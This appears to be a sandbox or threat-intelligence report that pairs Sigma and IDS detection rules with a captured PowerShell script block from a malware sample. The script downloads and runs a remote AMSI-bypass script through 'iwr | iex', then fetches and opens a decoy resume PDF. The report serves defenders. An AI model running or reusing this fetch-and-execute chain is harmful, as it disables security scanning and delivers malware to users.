sigma_analysis_results.rule_title: Dot net compiler compiles file from suspicious location
sigma_analysis_results.rule_description: Dot net compiler compiles file from suspicious location

Adversaries may use hidden windows to conceal malicious activity from the plain sight of users.
In some cases, windows that would typically be displayed when an application carries out an operation can be hidden

match_context.values:
@{ScriptBlockText=# Reflectively loaded amsihook
iwr https://ipfs-proxy-worker.creightonchingarande.workers.dev/amsibypass.ps1 -useb | iex
# Path to the resume PDF (quote the path due to spaces)
iwr -Uri "https://ipfs-proxy-worker.creightonchingarande.workers.dev/John Bradley Resume.pdf" -Outfile 'John Bradley Resume.pdf'
 $pdfPath = ".\John Bradley Resume.pdf"

# Verify the file exists
if (Test-Path $pdfPath) {
    # Open the PDF in the default viewer, forking the process
    Invoke-Item $pdfPath
    W [TRUNCATED]; Path=; ScriptBlockId=4063342a-e4b6-4854-82a0-40aa46be2ad1; MessageTotal=1; EventID=4104; MessageNumber=1}

sigma_analysis_results.rule_description: Detects execution of "csc.exe" to compile .NET code. Attackers often leverage this to compile code on the fly and use it in other stages.

When C# is compiled dynamically, a .cmdline file will be created as a part of the process.
Certain processes are not typically observed compiling C# code, but can do so without touching disk.
This can be used to unpack a payload for execution
Get the processes that are running on the local computer.

crowdsourced_ids_results.rule_msg: POLICY-OTHER HTTP request by IPv4 address attempt
crowdsourced_ids_results.rule_raw: alert tcp any any -> any $HTTP_PORTS ( msg:"POLICY-OTHER HTTP request by IPv4 address attempt"; flow:to_server,established; http_header; content:"Host:",fast_pattern,nocase; pcre:"/^Host\x3a\s*(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9]?[0-9])\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9]?[0-9])\s*:?\s*\d*\s*$/ims"; service:http; reference:url,www.w3.org/Protocols/rfc2616/rfc2616-sec15.html; classtype:policy-violation; sid:50447; rev:1; )
alert ( gid:119; sid:279; rev:1; msg:"(http_inspect) invalid status line"; metadata: rule-type preproc; classtype:unknown;)

crowdsourced_ids_results.rule_msg: ET INFO Dotted Quad Host PDF Request
crowdsourced_ids_results.rule_raw: alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET INFO Dotted Quad Host PDF Request"; flow:established,from_client; flowbits:isset,http.dottedquadhost; flowbits:set,http.dottedquadhost.pdf; flowbits:unset,http.dottedquadhost; http.request_line; content:".pdf HTTP/1."; nocase; fast_pattern; classtype:bad-unknown; sid:2027265; rev:5; metadata:attack_target Client_Endpoint, created_at 2019_04_23, deployment Perimeter, performance_impact Significant, confidence High, signature_severity Informational, updated_at 2022_11_21;)
